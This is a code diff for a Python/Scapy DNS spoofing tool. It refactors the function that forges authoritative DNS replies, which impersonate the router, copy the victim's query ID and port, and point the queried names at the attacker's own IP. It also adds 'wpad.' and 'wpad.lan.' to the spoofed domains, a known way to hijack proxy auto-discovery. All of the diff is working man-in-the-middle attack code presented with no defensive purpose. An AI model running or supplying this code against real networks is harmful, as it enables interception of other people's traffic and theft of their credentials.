@@ -25,10 +25,40 @@ hosts_dict = {
     # "facebook.com.": local_ip,
     "something.hello.": local_ip,
     "wpad.localdomain.": local_ip,
+    "wpad.": local_ip,
+    "wpad.lan.": local_ip,
     # "1.2.168.192.in-addr.arpa.": local_ip
 }
 
 domains = hosts_dict.keys()
+
+
+def send_forged_packet(packet_to_forge,target_ip, router_ip, original_qname, verbosity, printing_queue):
+
+
+    if verbosity > 0:
+        printing_queue.put(f"{BLUE}[?]DETECTED DNS TO FORGE{RESET}")
+    fake_dns_packet = IP() / UDP() / DNS() / DNSRR()
+
+    fake_dns_packet[IP].src = router_ip
+    fake_dns_packet[IP].dst = target_ip
+
+    fake_dns_packet[UDP].sport = 53
+    fake_dns_packet[UDP].dport = packet_to_forge[UDP].sport
+
+    fake_dns_packet[DNS].id = packet_to_forge[DNS].id
+    fake_dns_packet[DNS].qd = packet_to_forge.qd
+    fake_dns_packet[DNS].aa = 1
+    fake_dns_packet[DNS].qr = 1
+    fake_dns_packet[DNS].ancount = 1
+
+    fake_dns_packet[DNSRR].qname = packet_to_forge[DNSQR].qname
+    fake_dns_packet[DNSRR].rrname = packet_to_forge[DNSQR].qname
+    fake_dns_packet[DNSRR].rdata = local_ip
+
+    if verbosity > 0:
+        printing_queue.put(f"{GREEN}[+]Sending spoofed DNS packet: {original_qname} = {local_ip}{RESET}")
+    send(fake_dns_packet, verbose=0)
 
 
 def forge_packet_better(packet_to_forge, target_ip, router_ip, printing_queue, verbosity):
@@ -41,29 +71,7 @@ def forge_packet_better(packet_to_forge, target_ip, router_ip, printing_queue, v
     if verbosity > 0:
         printing_queue.put(f"{GREEN}[+] Dns with: "+ original_qname + f" arrived{RESET}")
     if str(original_qname) in domains:
-        if verbosity > 0:
-            printing_queue.put(f"{BLUE}[?]DETECTED DNS TO FORGE{RESET}")
-        fake_dns_packet = IP()/UDP()/DNS()/DNSRR()
-
-        fake_dns_packet[IP].src = router_ip
-        fake_dns_packet[IP].dst = target_ip
-
-        fake_dns_packet[UDP].sport = 53
-        fake_dns_packet[UDP].dport = packet_to_forge[UDP].sport
-
-        fake_dns_packet[DNS].id = packet_to_forge[DNS].id
-        fake_dns_packet[DNS].qd = packet_to_forge.qd
-        fake_dns_packet[DNS].aa = 1
-        fake_dns_packet[DNS].qr = 1
-        fake_dns_packet[DNS].ancount = 1
-
-        fake_dns_packet[DNSRR].qname = packet_to_forge[DNSQR].qname
-        fake_dns_packet[DNSRR].rrname = packet_to_forge[DNSQR].qname
-        fake_dns_packet[DNSRR].rdata = local_ip
-
-        if verbosity > 0:
-            printing_queue.put(f"{GREEN}[+]Sending spoofed DNS packet: {original_qname} = {local_ip}{RESET}")
-        send(fake_dns_packet, verbose=0)
+        send_forged_packet(packet_to_forge, target_ip, router_ip, original_qname, verbosity, printing_queue)
     else:
         forward_packet = IP() / UDP() / DNS()
         forward_packet[IP].dst = '8.8.8.8'
